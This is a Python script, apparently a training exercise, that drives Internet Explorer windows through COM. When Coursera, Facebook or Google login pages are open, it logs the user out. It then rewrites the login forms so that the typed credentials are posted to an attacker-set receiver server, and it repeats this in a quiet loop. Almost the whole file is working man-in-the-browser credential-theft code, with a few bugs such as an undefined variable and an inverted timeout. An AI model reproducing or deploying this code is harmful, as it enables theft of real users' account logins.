#!/usr/bin/env python3

import urllib
import urllib.parse as up
import win32com.client
import time
import random
import json

verbose = True
target_sites = {}


def vprint(verbose_string, lverbose=False):
    '''
    Provides easy way of adding line icons to print.
    '''
    global verbose
    if lverbose or verbose:
        if lverbose:
            icon = lverbose
        else:
            icon = '*'
        print('[{}] {}'.format(icon, verbose_string), flush=True)


def run(**args):
    if 'test' in args and args['test'] is True:
        return 'Shell code could be running'

    # Set receiving server
    if 'receiver' in args:
        data_receiver = args['receiver']
    else:
        data_receiver = 'http://localhost:8080'

    # HOMEWORK: Consider how to pull cookies or push stored credentials
    # through the DOM via an image tag or similar

    # Set target sites
    target_sites = {}
    if 'target_sites' in args:
        target_sites = json.loads(args['target_sites'])
    else:
        target_sites['www.coursera.org'] = {
            'logout_url': None,
            'logout_form': 'logout_form',
            'login_form_index': 0,
            'owned': False
        }
        target_sites['www.facebook.com'] = {
            'logout_url': None,
            'logout_form': 'SignoutForm',
            'login_form_index': 0,
            'owned': False
        }
        target_sites['accounts.google.com'] = {
            'logout_url': (
                'https://accounts.google.com/Logout?'
                'hl=en&continue=https://accounts.google.com/ServiceLogin'
                '%3Fservice%3Dmail'),
            'logout_form': None,
            'login_form_index': 0,
            'owned': False
        }

        # Use the same target for multiple Gmail domains
        target_sites['www.gmail.com'] = target_sites['accounts.google.com']
        target_sites['mail.google.com'] = target_sites['accounts.google.com']

    clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
    windows = win32com.client.Dispatch(clsid)

    while True:
        for browser in windows:
            url = up.urlparse(browser.LocationUrl)

            if url.hostname in target_sites:
                if target_sites[url.hostname]['owned']:
                    continue

                # Redirect if there is a URL
                if target_sites[url.hostname]['logout_url']:
                    doc_strings = browser.Document.body.innerHTML
                    if 'logout' in doc_strings.lower():
                        vprint(target_sites[url.hostname]['logout_url'])
                        browser.Navigate(target_sites[url.hostname]['logout_url'])
                        wait_for_browser(browser)

                    else:
                        vprint(doc_strings)
                        continue
                else:
                    # Retrieve all elements in the document
                    doc_forms = browser.Document.forms

                    # Iterate, looking for the logout form
                    for form in doc_forms:
                        try:
                            # Find the logout form and submit it
                            logout = target_sites[url.hostname]['logout_form']
                            if form.id == logout or 'logout' in form.id:
                                i.submit()
                                wait_for_browser(browser)
                        except Exception as eb:
                            vprint('Problem using logout form')
                            # Skip this browser session
                            raise

                # Modify the login form
                try:
                    login_idx = target_sites[url.hostname]['login_form_index']
                    login_page = up.quote(browser.LocationUrl)
                    form_action = '{}/{}'.format(data_receiver, login_page)
                    vprint(form_action)
                    for form in browser.Document.forms:
                        if 'login' in form.id or 'signin' in form.id:
                            form.action = form_action
                            target_sites[url.hostname]['owned'] = True
                    vprint(browser.Document.forms(login_idx))

                except Exception as ebo:
                    vprint('Problem sending login form', ebo)
                    raise

        time.sleep(random.randint(7, 12))


def wait_for_browser(browser):
    # Wait for the browser to finish loading a page or to timeout
    start_time = time.time()
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        timeout = start_time - time.time()
        if timeout > 32000:
            break
        else:
            time.sleep(0.12)
    return


if __name__ == '__main__':
    run(test=False)
